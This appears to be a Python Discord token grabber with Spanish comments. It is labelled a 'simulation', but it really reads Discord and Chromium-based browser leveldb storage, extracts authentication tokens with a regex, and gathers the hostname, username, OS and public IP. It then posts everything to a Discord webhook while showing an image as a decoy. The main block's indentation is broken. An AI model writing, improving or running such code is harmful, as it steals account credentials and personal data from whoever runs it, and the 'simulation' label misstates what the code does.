import os
import re
import platform
import socket
import uuid
import time
import requests
from PIL import Image

# Estilo consola hacker (solo en Windows)
if os.name == "nt":
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW("Data Extraction Simulation")
    os.system("color 4f")
    os.system("mode con: cols=80 lines=25")

# Función para obtener datos
def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except requests.exceptions.Timeout:
        return "Tiempo de espera agotado"
    except requests.exceptions.ConnectionError:
        return "Error de conexión"
    except requests.exceptions.HTTPError:
        return "Error HTTP"
    except requests.exceptions.RequestException:
        return "Error desconocido de red"

def safe_getlogin():
    try:
        return os.getlogin()
    except Exception:
        return os.environ.get("USERNAME") or "Usuario desconocido"

def get_system_info():
    return {
        "PC": socket.gethostname(),
        "Usuario": safe_getlogin(),
        "Sistema Operativo": platform.system(),
        "Versión SO": platform.version(),
        "Arquitectura": platform.machine(),
        "IP Pública": get_ip()
    }

def find_tokens():
    paths = {
        "Discord": os.path.join(os.getenv("APPDATA", ""), "Discord"),
        "Discord Canary": os.path.join(os.getenv("APPDATA", ""), "discordcanary"),
        "Discord PTB": os.path.join(os.getenv("APPDATA", ""), "discordptb"),
        "Google Chrome": os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default"),
        "Opera": os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA", ""), "Yandex", "YandexBrowser", "User Data", "Default"),
    }

    token_regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    tokens = []

    for platform_name, path in paths.items():
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(leveldb_path):
            continue

        for filename in os.listdir(leveldb_path):
            if not filename.endswith((".log", ".ldb")):
                continue
            try:
                with open(os.path.join(leveldb_path, filename), "r", errors="ignore") as file:
                    content = file.read()
                    found_tokens = token_regex.findall(content)
                    for token in found_tokens:
                        tokens.append((platform_name, token))
            except Exception:
                continue

    return tokens

def simulate_extraction(webhook, image_path):
    # Mostrar imagen
    try:
        img = Image.open(image_path)
        img.show()
    except Exception as e:
        print(f"No se pudo abrir la imagen: {e}")

    print("\n[+] Simulando extracción de datos...\n")
    time.sleep(1)

    # Obtener datos
    info = get_system_info()
    tokens = find_tokens()

    # Crear texto
    text = "**Información del Sistema:**\n"
    for key, value in info.items():
        text += f"> `{key}: {value}`\n"

    text += "\n**Tokens Encontrados:**\n"
    if tokens:
        for plataforma, token in tokens:
            text += f"> `{plataforma}`: `{token}`\n"
    else:
        text += "> No se encontraron tokens.\n"

    # Enviar al webhook
    try:
        requests.post(webhook, json={"content": text})
        print("\n Información enviada al webhook.")
    except Exception as e:
        print(f"\n Error al enviar al webhook: {e}")


# Inputs
if __name__ == "__main__":
webhook = input("Ingresa tu Webhook de Discord: ").strip()
image_path = input("Ruta de la imagen (JPG/PNG): ").strip()
simulate_extraction(webhook, image_path)
